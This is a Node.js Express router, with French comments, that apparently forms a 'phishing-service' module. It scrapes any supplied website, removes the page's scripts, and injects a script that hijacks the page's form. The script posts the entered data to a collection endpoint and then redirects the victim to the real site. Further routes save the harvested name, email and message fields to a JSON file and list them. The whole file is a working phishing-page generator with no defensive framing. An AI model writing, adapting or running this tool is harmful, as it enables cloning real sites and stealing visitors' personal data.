import express from "express";
import axios from "axios";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";
import url from "url";

// Convertir l'URL du module en chemin absolu du fichier
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);  // __dirname obtenu en utilisant import.meta.url

const router = express.Router();

// Chemin du fichier JSON pour stocker les soumissions
const SUBMISSIONS_FILE = path.join(__dirname, "submissions.json");

// Fonction pour obtenir le nom de domaine du site
const getDomainName = (urlStr) => {
    const parsedUrl = new url.URL(urlStr);
    return parsedUrl.hostname.replace(/^www\./, ''); // Enlever "www." si présent
};

// Route pour générer un fichier HTML à partir d'une URL donnée
router.get('/', async (req, res) => {
    const { url: siteUrl } = req.query;

    if (!siteUrl) {
        return res.status(400).send("L'URL est requise");
    }

    try {
        // Scraping du site
        const response = await axios.get(siteUrl);
        let referenceContent = response.data;

        // Extraire le nom de domaine pour le nom du fichier
        const domainName = getDomainName(siteUrl);
        const TEMP_HTML_FILE = path.join(__dirname, `${domainName}.html`); // Créer un nom de fichier unique basé sur le nom du domaine

        // Supprimer tous les <script> du contenu HTML
        referenceContent = referenceContent.replace(/<script[^>]*>([\S\s]*?)<\/script>/g, '');

        // Ajouter le script pour intercepter le formulaire et rediriger après soumission
        const script = `
            <script>
                document.addEventListener("DOMContentLoaded", function() {
                    const form = document.querySelector("form");
                    form.addEventListener("submit", function(event) {
                        event.preventDefault(); // Empêcher la soumission par défaut du formulaire
                        
                        const formData = new FormData(form);
                        
                        // Envoyer les données à l'URL de l'API
                        fetch("http://localhost:4000/features/phishing-service/send-datas", {
                            method: "POST",
                            body: formData,
                            mode: 'cors'
                        })
                        .then(response => {
                            if (response.ok) {
                                // Si l'envoi est réussi, rediriger vers le site d'origine
                                window.location.href = "${siteUrl}";
                            } else {
                                alert("Une erreur est survenue lors de l'envoi des données.");
                            }
                        })
                        .catch(error => {
                            console.error("Erreur lors de l'envoi des données:", error);
                            alert("Une erreur est survenue. Veuillez réessayer.");
                        });
                    });
                });
            </script>
        `;

        // Injecter le script dans le contenu HTML nettoyé
        referenceContent += script;

        // Écrire le contenu nettoyé avec le script dans un fichier temporaire
        fs.writeFileSync(TEMP_HTML_FILE, referenceContent);

        // Message à renvoyer à l'utilisateur
        res.send({
            message: `Fichier HTML généré avec succès ! Vous pouvez l'ouvrir à cet emplacement : ${TEMP_HTML_FILE}`,
            info: `Vous pourrez retrouver toutes les informations à cette requête : http://localhost:4000/features/phishing-service/send-datas`
        });

    } catch (error) {
        console.error("Erreur lors du scraping du site :", error);
        res.status(500).send("Erreur lors du scraping du site");
    }
});

// Route pour recevoir les données du formulaire et les enregistrer dans un fichier JSON
router.post('/send-datas', async (req, res) => {
    const { name, email, message } = req.body;

    if (!name || !email || !message) {
        return res.status(400).json({ error: "Tous les champs du formulaire sont requis." });
    }

    try {
        // Lire les données existantes dans le fichier JSON
        let submissions = [];
        if (fs.existsSync(SUBMISSIONS_FILE)) {
            const data = fs.readFileSync(SUBMISSIONS_FILE, "utf8");
            submissions = JSON.parse(data);
        }

        // Ajouter la nouvelle soumission
        const newSubmission = { name, email, message, timestamp: new Date() };
        submissions.push(newSubmission);

        // Sauvegarder les soumissions mises à jour dans le fichier JSON
        fs.writeFileSync(SUBMISSIONS_FILE, JSON.stringify(submissions, null, 2));

        // Réponse de succès
        res.status(200).json({
            message: "Données reçues avec succès !",
            submission: newSubmission
        });
    } catch (error) {
        console.error("Erreur lors du traitement des données :", error);
        res.status(500).json({ error: "Une erreur est survenue lors de la soumission." });
    }
});

// Route pour afficher toutes les soumissions depuis le fichier JSON
router.get('/datas', async (req, res) => {
    try {
        // Vérifier si le fichier existe
        if (!fs.existsSync(SUBMISSIONS_FILE)) {
            return res.status(404).json({ message: "Aucune soumission trouvée." });
        }

        // Lire les soumissions depuis le fichier JSON
        const data = fs.readFileSync(SUBMISSIONS_FILE, "utf8");
        const submissions = JSON.parse(data);

        // Répondre avec les soumissions
        res.status(200).json(submissions);
    } catch (error) {
        console.error("Erreur lors de la récupération des données :", error);
        res.status(500).json({ error: "Une erreur est survenue lors de la récupération des données." });
    }
});

export default router;
